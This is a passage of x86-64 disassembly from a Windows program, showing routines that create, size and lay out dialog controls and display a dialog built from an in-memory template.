   140001ea8:	48 89 87 30 20 00 00 	mov    %rax,0x2030(%rdi)
   140001eaf:	41 b9 84 08 30 50    	mov    $0x50300884,%r9d
   140001eb5:	48 8b 07             	mov    (%rdi),%rax
   140001eb8:	45 33 c0             	xor    %r8d,%r8d
   140001ebb:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001ec0:	b9 00 02 00 00       	mov    $0x200,%ecx
   140001ec5:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001ec9:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001ece:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001ed3:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001eda:	80 
   140001edb:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001ee2:	80 
   140001ee3:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001eea:	80 
   140001eeb:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001ef2:	80 
   140001ef3:	ff 15 bf 94 02 00    	call   *0x294bf(%rip)        # 0x14002b3b8
   140001ef9:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001efe:	4c 8d 05 8b 9c 02 00 	lea    0x29c8b(%rip),%r8        # 0x14002bb90
   140001f05:	48 89 87 38 20 00 00 	mov    %rax,0x2038(%rdi)
   140001f0c:	48 8d 15 8d 9c 02 00 	lea    0x29c8d(%rip),%rdx        # 0x14002bba0
   140001f13:	48 8b 07             	mov    (%rdi),%rax
   140001f16:	41 b9 01 00 00 50    	mov    $0x50000001,%r9d
   140001f1c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001f21:	33 c9                	xor    %ecx,%ecx
   140001f23:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001f27:	48 c7 44 24 48 01 00 	movq   $0x1,0x48(%rsp)
   140001f2e:	00 00 
   140001f30:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001f35:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001f3c:	80 
   140001f3d:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001f44:	80 
   140001f45:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001f4c:	80 
   140001f4d:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001f54:	80 
   140001f55:	ff 15 5d 94 02 00    	call   *0x2945d(%rip)        # 0x14002b3b8
   140001f5b:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f62:	45 33 c0             	xor    %r8d,%r8d
   140001f65:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f69:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f6e:	48 89 87 40 20 00 00 	mov    %rax,0x2040(%rdi)
   140001f75:	ff 15 15 95 02 00    	call   *0x29515(%rip)        # 0x14002b490
   140001f7b:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f82:	ba 80 00 00 00       	mov    $0x80,%edx
   140001f87:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001f8b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001f91:	ff 15 f9 94 02 00    	call   *0x294f9(%rip)        # 0x14002b490
   140001f97:	4c 8b 8f 50 20 00 00 	mov    0x2050(%rdi),%r9
   140001f9e:	48 8b 8f 28 20 00 00 	mov    0x2028(%rdi),%rcx
   140001fa5:	ba 72 01 00 00       	mov    $0x172,%edx
   140001faa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001fb0:	ff 15 da 94 02 00    	call   *0x294da(%rip)        # 0x14002b490
   140001fb6:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001fbd:	4d 85 c0             	test   %r8,%r8
   140001fc0:	74 72                	je     0x140002034
   140001fc2:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001fc6:	ba 30 00 00 00       	mov    $0x30,%edx
   140001fcb:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fd1:	ff 15 b9 94 02 00    	call   *0x294b9(%rip)        # 0x14002b490
   140001fd7:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001fde:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fe4:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   140001feb:	ba 30 00 00 00       	mov    $0x30,%edx
   140001ff0:	ff 15 9a 94 02 00    	call   *0x2949a(%rip)        # 0x14002b490
   140001ff6:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   140001ffd:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002003:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   14000200a:	ba 30 00 00 00       	mov    $0x30,%edx
   14000200f:	ff 15 7b 94 02 00    	call   *0x2947b(%rip)        # 0x14002b490
   140002015:	4c 8b 87 48 20 00 00 	mov    0x2048(%rdi),%r8
   14000201c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002022:	48 8b 8f 40 20 00 00 	mov    0x2040(%rdi),%rcx
   140002029:	ba 30 00 00 00       	mov    $0x30,%edx
   14000202e:	ff 15 5c 94 02 00    	call   *0x2945c(%rip)        # 0x14002b490
   140002034:	48 8b 8f 30 20 00 00 	mov    0x2030(%rdi),%rcx
   14000203b:	4c 8d 4f 28          	lea    0x28(%rdi),%r9
   14000203f:	45 33 c0             	xor    %r8d,%r8d
   140002042:	ba 0c 00 00 00       	mov    $0xc,%edx
   140002047:	ff 15 43 94 02 00    	call   *0x29443(%rip)        # 0x14002b490
   14000204d:	4c 8b 4f 20          	mov    0x20(%rdi),%r9
   140002051:	45 33 c0             	xor    %r8d,%r8d
   140002054:	48 8b 8f 38 20 00 00 	mov    0x2038(%rdi),%rcx
   14000205b:	ba 0c 00 00 00       	mov    $0xc,%edx
   140002060:	ff 15 2a 94 02 00    	call   *0x2942a(%rip)        # 0x14002b490
   140002066:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000206a:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000206f:	ff 15 d3 93 02 00    	call   *0x293d3(%rip)        # 0x14002b448
   140002075:	85 c0                	test   %eax,%eax
   140002077:	74 1e                	je     0x140002097
   140002079:	44 0f b7 44 24 6c    	movzwl 0x6c(%rsp),%r8d
   14000207f:	48 8b cf             	mov    %rdi,%rcx
   140002082:	0f b7 54 24 68       	movzwl 0x68(%rsp),%edx
   140002087:	66 44 2b 44 24 64    	sub    0x64(%rsp),%r8w
   14000208d:	66 2b 54 24 60       	sub    0x60(%rsp),%dx
   140002092:	e8 e9 00 00 00       	call   0x140002180
   140002097:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   14000209e:	00 
   14000209f:	48 33 cc             	xor    %rsp,%rcx
   1400020a2:	e8 19 a5 00 00       	call   0x14000c5c0
   1400020a7:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   1400020ae:	00 
   1400020af:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400020b3:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   1400020b7:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400020bb:	49 8b e3             	mov    %r11,%rsp
   1400020be:	5f                   	pop    %rdi
   1400020bf:	c3                   	ret
   1400020c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020c5:	57                   	push   %rdi
   1400020c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400020ca:	49 8b f9             	mov    %r9,%rdi
   1400020cd:	48 8b d9             	mov    %rcx,%rbx
   1400020d0:	83 ea 05             	sub    $0x5,%edx
   1400020d3:	74 66                	je     0x14000213b
   1400020d5:	83 ea 0b             	sub    $0xb,%edx
   1400020d8:	74 5a                	je     0x140002134
   1400020da:	81 ea 00 01 00 00    	sub    $0x100,%edx
   1400020e0:	74 28                	je     0x14000210a
   1400020e2:	83 fa 01             	cmp    $0x1,%edx
   1400020e5:	75 7f                	jne    0x140002166
   1400020e7:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   1400020eb:	66 3b c2             	cmp    %dx,%ax
   1400020ee:	77 0a                	ja     0x1400020fa
   1400020f0:	41 0f b7 d0          	movzwl %r8w,%edx
   1400020f4:	ff 15 7e 93 02 00    	call   *0x2937e(%rip)        # 0x14002b478
   1400020fa:	b8 01 00 00 00       	mov    $0x1,%eax
   1400020ff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002104:	48 83 c4 20          	add    $0x20,%rsp
   140002108:	5f                   	pop    %rdi
   140002109:	c3                   	ret
   14000210a:	4c 8b c7             	mov    %rdi,%r8
   14000210d:	49 89 59 08          	mov    %rbx,0x8(%r9)
   140002111:	ba 10 00 00 00       	mov    $0x10,%edx
   140002116:	ff 15 1c 93 02 00    	call   *0x2931c(%rip)        # 0x14002b438
   14000211c:	48 8b cf             	mov    %rdi,%rcx
   14000211f:	e8 bc fb ff ff       	call   0x140001ce0
   140002124:	b8 01 00 00 00       	mov    $0x1,%eax
   140002129:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000212e:	48 83 c4 20          	add    $0x20,%rsp
   140002132:	5f                   	pop    %rdi
   140002133:	c3                   	ret
   140002134:	ba 02 00 00 00       	mov    $0x2,%edx
   140002139:	eb b9                	jmp    0x1400020f4
   14000213b:	ba 10 00 00 00       	mov    $0x10,%edx
   140002140:	ff 15 fa 92 02 00    	call   *0x292fa(%rip)        # 0x14002b440
   140002146:	4c 8b c7             	mov    %rdi,%r8
   140002149:	0f b7 d7             	movzwl %di,%edx
   14000214c:	49 c1 e8 10          	shr    $0x10,%r8
   140002150:	48 8b c8             	mov    %rax,%rcx
   140002153:	e8 28 00 00 00       	call   0x140002180
   140002158:	45 33 c0             	xor    %r8d,%r8d
   14000215b:	33 d2                	xor    %edx,%edx
   14000215d:	48 8b cb             	mov    %rbx,%rcx
   140002160:	ff 15 ea 92 02 00    	call   *0x292ea(%rip)        # 0x14002b450
   140002166:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000216b:	33 c0                	xor    %eax,%eax
   14000216d:	48 83 c4 20          	add    $0x20,%rsp
   140002171:	5f                   	pop    %rdi
   140002172:	c3                   	ret
   140002173:	cc                   	int3
   140002174:	cc                   	int3
   140002175:	cc                   	int3
   140002176:	cc                   	int3
   140002177:	cc                   	int3
   140002178:	cc                   	int3
   140002179:	cc                   	int3
   14000217a:	cc                   	int3
   14000217b:	cc                   	int3
   14000217c:	cc                   	int3
   14000217d:	cc                   	int3
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	40 53                	rex push %rbx
   140002182:	55                   	push   %rbp
   140002183:	56                   	push   %rsi
   140002184:	57                   	push   %rdi
   140002185:	41 56                	push   %r14
   140002187:	48 83 ec 50          	sub    $0x50,%rsp
   14000218b:	48 8b 05 ae be 03 00 	mov    0x3beae(%rip),%rax        # 0x14003e040
   140002192:	48 33 c4             	xor    %rsp,%rax
   140002195:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000219a:	48 8b f1             	mov    %rcx,%rsi
   14000219d:	0f b7 ea             	movzwl %dx,%ebp
   1400021a0:	48 8b 89 30 20 00 00 	mov    0x2030(%rcx),%rcx
   1400021a7:	45 0f b7 f0          	movzwl %r8w,%r14d
   1400021ab:	ff 15 af 92 02 00    	call   *0x292af(%rip)        # 0x14002b460
   1400021b1:	48 8b d8             	mov    %rax,%rbx
   1400021b4:	48 85 c0             	test   %rax,%rax
   1400021b7:	0f 84 90 00 00 00    	je     0x14000224d
   1400021bd:	0f b7 8e 58 20 00 00 	movzwl 0x2058(%rsi),%ecx
   1400021c4:	33 ff                	xor    %edi,%edi
   1400021c6:	0f b7 86 5e 20 00 00 	movzwl 0x205e(%rsi),%eax
   1400021cd:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400021d2:	89 7c 24 3c          	mov    %edi,0x3c(%rsp)
   1400021d6:	8d 14 49             	lea    (%rcx,%rcx,2),%edx
   1400021d9:	8b cd                	mov    %ebp,%ecx
   1400021db:	2b ca                	sub    %edx,%ecx
   1400021dd:	48 8b 96 48 20 00 00 	mov    0x2048(%rsi),%rdx
   1400021e4:	2b c8                	sub    %eax,%ecx
   1400021e6:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   1400021ea:	48 85 d2             	test   %rdx,%rdx
   1400021ed:	74 0c                	je     0x1400021fb
   1400021ef:	48 8b cb             	mov    %rbx,%rcx
   1400021f2:	ff 15 40 8e 02 00    	call   *0x28e40(%rip)        # 0x14002b038
   1400021f8:	48 8b f8             	mov    %rax,%rdi
   1400021fb:	48 8d 56 28          	lea    0x28(%rsi),%rdx
   1400021ff:	c7 44 24 20 50 25 00 	movl   $0x2550,0x20(%rsp)
   140002206:	00 
   140002207:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000220c:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002212:	48 8b cb             	mov    %rbx,%rcx
   140002215:	ff 15 4d 92 02 00    	call   *0x2924d(%rip)        # 0x14002b468
   14000221b:	48 83 be 48 20 00 00 	cmpq   $0x0,0x2048(%rsi)
   140002222:	00 
   140002223:	74 0c                	je     0x140002231
   140002225:	48 8b d7             	mov    %rdi,%rdx
   140002228:	48 8b cb             	mov    %rbx,%rcx
   14000222b:	ff 15 07 8e 02 00    	call   *0x28e07(%rip)        # 0x14002b038
   140002231:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   140002238:	48 8b d3             	mov    %rbx,%rdx
   14000223b:	ff 15 17 92 02 00    	call   *0x29217(%rip)        # 0x14002b458
   140002241:	0f b7 54 24 3c       	movzwl 0x3c(%rsp),%edx
   140002246:	66 2b 54 24 34       	sub    0x34(%rsp),%dx
   14000224b:	eb 05                	jmp    0x140002252
   14000224d:	ba 14 00 00 00       	mov    $0x14,%edx
   140002252:	0f b7 8e 60 20 00 00 	movzwl 0x2060(%rsi),%ecx
   140002259:	44 0f b7 8e 5e 20 00 	movzwl 0x205e(%rsi),%r9d
   140002260:	00 
   140002261:	66 3b d1             	cmp    %cx,%dx
   140002264:	0f b7 c1             	movzwl %cx,%eax
   140002267:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000226e:	00 
   14000226f:	66 0f 43 c2          	cmovae %dx,%ax
   140002273:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140002277:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   14000227e:	48 8b 8e 28 20 00 00 	mov    0x2028(%rsi),%rcx
   140002285:	44 8b c2             	mov    %edx,%r8d
   140002288:	0f b7 d8             	movzwl %ax,%ebx
   14000228b:	ff 15 f7 91 02 00    	call   *0x291f7(%rip)        # 0x14002b488
   140002291:	0f b7 be 58 20 00 00 	movzwl 0x2058(%rsi),%edi
   140002298:	0f b7 c5             	movzwl %bp,%eax
   14000229b:	0f b7 cf             	movzwl %di,%ecx
   14000229e:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022a5:	00 
   1400022a6:	66 03 c9             	add    %cx,%cx
   1400022a9:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400022ad:	66 03 8e 5e 20 00 00 	add    0x205e(%rsi),%cx
   1400022b4:	66 2b c7             	sub    %di,%ax
   1400022b7:	66 2b c1             	sub    %cx,%ax
   1400022ba:	0f b7 d1             	movzwl %cx,%edx
   1400022bd:	48 8b 8e 30 20 00 00 	mov    0x2030(%rsi),%rcx
   1400022c4:	44 8b c7             	mov    %edi,%r8d
   1400022c7:	44 0f b7 c8          	movzwl %ax,%r9d
   1400022cb:	ff 15 b7 91 02 00    	call   *0x291b7(%rip)        # 0x14002b488
   1400022d1:	0f b7 96 58 20 00 00 	movzwl 0x2058(%rsi),%edx
   1400022d8:	41 0f b7 ce          	movzwl %r14w,%ecx
   1400022dc:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400022e3:	00 
   1400022e4:	8d 04 13             	lea    (%rbx,%rdx,1),%eax
   1400022e7:	66 03 f8             	add    %ax,%di
   1400022ea:	0f b7 c2             	movzwl %dx,%eax
   1400022ed:	66 03 c0             	add    %ax,%ax
   1400022f0:	44 0f b7 c7          	movzwl %di,%r8d
   1400022f4:	66 2b c8             	sub    %ax,%cx
   1400022f7:	0f b7 c5             	movzwl %bp,%eax
   1400022fa:	66 2b 8e 5c 20 00 00 	sub    0x205c(%rsi),%cx
   140002301:	66 2b c2             	sub    %dx,%ax
   140002304:	66 2b cf             	sub    %di,%cx
   140002307:	66 2b c2             	sub    %dx,%ax
   14000230a:	44 0f b7 d1          	movzwl %cx,%r10d
   14000230e:	48 8b 8e 38 20 00 00 	mov    0x2038(%rsi),%rcx
   140002315:	44 0f b7 c8          	movzwl %ax,%r9d
   140002319:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000231e:	ff 15 64 91 02 00    	call   *0x29164(%rip)        # 0x14002b488
   140002324:	0f b7 96 5a 20 00 00 	movzwl 0x205a(%rsi),%edx
   14000232b:	0f b7 86 58 20 00 00 	movzwl 0x2058(%rsi),%eax
   140002332:	44 8b ca             	mov    %edx,%r9d
   140002335:	44 0f b7 96 5c 20 00 	movzwl 0x205c(%rsi),%r10d
   14000233c:	00 
   14000233d:	66 44 2b f0          	sub    %ax,%r14w
   140002341:	48 8b 8e 40 20 00 00 	mov    0x2040(%rsi),%rcx
   140002348:	66 2b e8             	sub    %ax,%bp
   14000234b:	66 45 2b f2          	sub    %r10w,%r14w
   14000234f:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140002356:	00 
   140002357:	66 2b ea             	sub    %dx,%bp
   14000235a:	45 0f b7 c6          	movzwl %r14w,%r8d
   14000235e:	0f b7 d5             	movzwl %bp,%edx
   140002361:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   140002366:	ff 15 1c 91 02 00    	call   *0x2911c(%rip)        # 0x14002b488
   14000236c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002371:	48 33 cc             	xor    %rsp,%rcx
   140002374:	e8 47 a2 00 00       	call   0x14000c5c0
   140002379:	48 83 c4 50          	add    $0x50,%rsp
   14000237d:	41 5e                	pop    %r14
   14000237f:	5f                   	pop    %rdi
   140002380:	5e                   	pop    %rsi
   140002381:	5d                   	pop    %rbp
   140002382:	5b                   	pop    %rbx
   140002383:	c3                   	ret
   140002384:	cc                   	int3
   140002385:	cc                   	int3
   140002386:	cc                   	int3
   140002387:	cc                   	int3
   140002388:	cc                   	int3
   140002389:	cc                   	int3
   14000238a:	cc                   	int3
   14000238b:	cc                   	int3
   14000238c:	cc                   	int3
   14000238d:	cc                   	int3
   14000238e:	cc                   	int3
   14000238f:	cc                   	int3
   140002390:	40 55                	rex push %rbp
   140002392:	53                   	push   %rbx
   140002393:	56                   	push   %rsi
   140002394:	57                   	push   %rdi
   140002395:	41 56                	push   %r14
   140002397:	48 8d ac 24 30 df ff 	lea    -0x20d0(%rsp),%rbp
   14000239e:	ff 
   14000239f:	b8 d0 21 00 00       	mov    $0x21d0,%eax
   1400023a4:	e8 17 a5 00 00       	call   0x14000c8c0
   1400023a9:	48 2b e0             	sub    %rax,%rsp
   1400023ac:	48 8b 05 8d bc 03 00 	mov    0x3bc8d(%rip),%rax        # 0x14003e040
   1400023b3:	48 33 c4             	xor    %rsp,%rax
   1400023b6:	48 89 85 c0 20 00 00 	mov    %rax,0x20c0(%rbp)
   1400023bd:	48 8b d9             	mov    %rcx,%rbx
   1400023c0:	4d 8b f0             	mov    %r8,%r14
   1400023c3:	33 c9                	xor    %ecx,%ecx
   1400023c5:	48 8b f2             	mov    %rdx,%rsi
   1400023c8:	ff 15 ea 8c 02 00    	call   *0x28cea(%rip)        # 0x14002b0b8
   1400023ce:	33 d2                	xor    %edx,%edx
   1400023d0:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   1400023d7:	41 b8 02 01 00 00    	mov    $0x102,%r8d
   1400023dd:	48 8b f8             	mov    %rax,%rdi
   1400023e0:	e8 5b 81 02 00       	call   0x14002a540
   1400023e5:	33 c9                	xor    %ecx,%ecx
   1400023e7:	c7 85 a0 1f 00 00 84 	movl   $0x90cc0884,0x1fa0(%rbp)
   1400023ee:	08 cc 90 
   1400023f1:	48 89 8d a4 1f 00 00 	mov    %rcx,0x1fa4(%rbp)
   1400023f8:	4c 8d 05 b1 97 02 00 	lea    0x297b1(%rip),%r8        # 0x14002bbb0
   1400023ff:	66 89 8d b4 1f 00 00 	mov    %cx,0x1fb4(%rbp)
   140002406:	ba 40 00 00 00       	mov    $0x40,%edx
   14000240b:	48 8d 8d b6 1f 00 00 	lea    0x1fb6(%rbp),%rcx
   140002412:	c7 85 ac 1f 00 00 00 	movl   $0xc80000,0x1fac(%rbp)
   140002419:	00 c8 00 
   14000241c:	c7 85 b0 1f 00 00 96 	movl   $0x96,0x1fb0(%rbp)
   140002423:	00 00 00 
   140002426:	e8 95 01 00 00       	call   0x1400025c0
   14000242b:	33 c0                	xor    %eax,%eax
   14000242d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140002432:	33 d2                	xor    %edx,%edx
   140002434:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002439:	41 b8 40 20 00 00    	mov    $0x2040,%r8d
   14000243f:	e8 fc 80 02 00       	call   0x14002a540
   140002444:	48 8b cb             	mov    %rbx,%rcx
   140002447:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000244c:	e8 8b 55 01 00       	call   0x1400179dc
   140002451:	48 8b ce             	mov    %rsi,%rcx
   140002454:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002459:	e8 7e 55 01 00       	call   0x1400179dc
   14000245e:	49 8b ce             	mov    %r14,%rcx
   140002461:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002466:	e8 71 55 01 00       	call   0x1400179dc
   14000246b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002470:	4c 8d 0d 49 fc ff ff 	lea    -0x3b7(%rip),%r9        # 0x1400020c0
   140002477:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000247c:	45 33 c0             	xor    %r8d,%r8d
   14000247f:	48 8d 95 a0 1f 00 00 	lea    0x1fa0(%rbp),%rdx
   140002486:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000248b:	48 8b cf             	mov    %rdi,%rcx
   14000248e:	ff 15 ec 8f 02 00    	call   *0x28fec(%rip)        # 0x14002b480
   140002494:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002499:	48 8b d8             	mov    %rax,%rbx
   14000249c:	e8 ff 2a 01 00       	call   0x140014fa0
   1400024a1:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400024a6:	e8 f5 2a 01 00       	call   0x140014fa0
   1400024ab:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400024b0:	e8 eb 2a 01 00       	call   0x140014fa0
   1400024b5:	48 8b 8d 78 1f 00 00 	mov    0x1f78(%rbp),%rcx
   1400024bc:	48 85 c9             	test   %rcx,%rcx
   1400024bf:	74 06                	je     0x1400024c7
   1400024c1:	ff 15 79 8b 02 00    	call   *0x28b79(%rip)        # 0x14002b040
   1400024c7:	48 8b 8d 80 1f 00 00 	mov    0x1f80(%rbp),%rcx
   1400024ce:	48 85 c9             	test   %rcx,%rcx
   1400024d1:	74 06                	je     0x1400024d9
   1400024d3:	ff 15 57 8f 02 00    	call   *0x28f57(%rip)        # 0x14002b430
   1400024d9:	8b c3                	mov    %ebx,%eax
   1400024db:	48 8b 8d c0 20 00 00 	mov    0x20c0(%rbp),%rcx
   1400024e2:	48 33 cc             	xor    %rsp,%rcx
   1400024e5:	e8 d6 a0 00 00       	call   0x14000c5c0
   1400024ea:	48 81 c4 d0 21 00 00 	add    $0x21d0,%rsp
   1400024f1:	41 5e                	pop    %r14
   1400024f3:	5f                   	pop    %rdi
   1400024f4:	5e                   	pop    %rsi
   1400024f5:	5b                   	pop    %rbx
   1400024f6:	5d                   	pop    %rbp
   1400024f7:	c3                   	ret
   1400024f8:	cc                   	int3
   1400024f9:	cc                   	int3
   1400024fa:	cc                   	int3
   1400024fb:	cc                   	int3
   1400024fc:	cc                   	int3
   1400024fd:	cc                   	int3
   1400024fe:	cc                   	int3
   1400024ff:	cc                   	int3
   140002500:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002505:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000250a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000250f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002514:	41 56                	push   %r14
   140002516:	48 83 ec 20          	sub    $0x20,%rsp
   14000251a:	33 ff                	xor    %edi,%edi
   14000251c:	49 8b d8             	mov    %r8,%rbx
   14000251f:	48 8b f2             	mov    %rdx,%rsi
   140002522:	44 8b f7             	mov    %edi,%r14d
   140002525:	8b ef                	mov    %edi,%ebp
   140002527:	48 85 c9             	test   %rcx,%rcx
   14000252a:	74 0d                	je     0x140002539
   14000252c:	45 33 c0             	xor    %r8d,%r8d
   14000252f:	33 d2                	xor    %edx,%edx
   140002531:	e8 ca 6e 00 00       	call   0x140009400
   140002536:	48 8b f8             	mov    %rax,%rdi
   140002539:	48 85 f6             	test   %rsi,%rsi
   14000253c:	74 10                	je     0x14000254e
   14000253e:	45 33 c0             	xor    %r8d,%r8d
   140002541:	33 d2                	xor    %edx,%edx
   140002543:	48 8b ce             	mov    %rsi,%rcx
   140002546:	e8 b5 6e 00 00       	call   0x140009400
   14000254b:	4c 8b f0             	mov    %rax,%r14
   14000254e:	48 85 db             	test   %rbx,%rbx
   140002551:	74 10                	je     0x140002563
   140002553:	45 33 c0             	xor    %r8d,%r8d
   140002556:	33 d2                	xor    %edx,%edx
   140002558:	48 8b cb             	mov    %rbx,%rcx
   14000255b:	e8 a0 6e 00 00       	call   0x140009400
   140002560:	48 8b e8             	mov    %rax,%rbp
   140002563:	48 85 ed             	test   %rbp,%rbp
   140002566:	4c 8d 05 83 96 02 00 	lea    0x29683(%rip),%r8        # 0x14002bbf0
   14000256d:	49 8b d6             	mov    %r14,%rdx
   140002570:	48 8b cf             	mov    %rdi,%rcx
   140002573:	4c 0f 45 c5          	cmovne %rbp,%r8
   140002577:	e8 14 fe ff ff       	call   0x140002390
   14000257c:	48 8b cf             	mov    %rdi,%rcx
   14000257f:	8b d8                	mov    %eax,%ebx
   140002581:	e8 1a 2a 01 00       	call   0x140014fa0
   140002586:	49 8b ce             	mov    %r14,%rcx
   140002589:	e8 12 2a 01 00       	call   0x140014fa0
   14000258e:	48 8b cd             	mov    %rbp,%rcx
   140002591:	e8 0a 2a 01 00       	call   0x140014fa0
   140002596:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000259b:	8b c3                	mov    %ebx,%eax
   14000259d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025a2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400025a7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400025ac:	48 83 c4 20          	add    $0x20,%rsp
   1400025b0:	41 5e                	pop    %r14
   1400025b2:	c3                   	ret
   1400025b3:	cc                   	int3
   1400025b4:	cc                   	int3
   1400025b5:	cc                   	int3
   1400025b6:	cc                   	int3
   1400025b7:	cc                   	int3
   1400025b8:	cc                   	int3
   1400025b9:	cc                   	int3
   1400025ba:	cc                   	int3
   1400025bb:	cc                   	int3
   1400025bc:	cc                   	int3
   1400025bd:	cc                   	int3
   1400025be:	cc                   	int3
   1400025bf:	cc                   	int3
   1400025c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400025c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400025ca:	53                   	push   %rbx
   1400025cb:	55                   	push   %rbp
   1400025cc:	56                   	push   %rsi
   1400025cd:	57                   	push   %rdi
   1400025ce:	48 83 ec 38          	sub    $0x38,%rsp
   1400025d2:	49 8b f0             	mov    %r8,%rsi
   1400025d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400025da:	48 8b da             	mov    %rdx,%rbx
   1400025dd:	48 8b f9             	mov    %rcx,%rdi
   1400025e0:	e8 5b ea ff ff       	call   0x140001040
   1400025e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400025ea:	4c 8b ce             	mov    %rsi,%r9
   1400025ed:	4c 8b c3             	mov    %rbx,%r8
   1400025f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400025f7:	00 00 
   1400025f9:	48 8b d7             	mov    %rdi,%rdx
   1400025fc:	48 8b 08             	mov    (%rax),%rcx
   1400025ff:	e8 44 26 01 00       	call   0x140014c48
   140002604:	85 c0                	test   %eax,%eax
   140002606:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000260b:	0f 48 c1             	cmovs  %ecx,%eax
   14000260e:	48 83 c4 38          	add    $0x38,%rsp
   140002612:	5f                   	pop    %rdi
   140002613:	5e                   	pop    %rsi
   140002614:	5d                   	pop    %rbp
   140002615:	5b                   	pop    %rbx
   140002616:	c3                   	ret
   140002617:	cc                   	int3
   140002618:	cc                   	int3
   140002619:	cc                   	int3
   14000261a:	cc                   	int3
   14000261b:	cc                   	int3
   14000261c:	cc                   	int3
   14000261d:	cc                   	int3
   14000261e:	cc                   	int3
   14000261f:	cc                   	int3
   140002620:	40 53                	rex push %rbx
   140002622:	55                   	push   %rbp
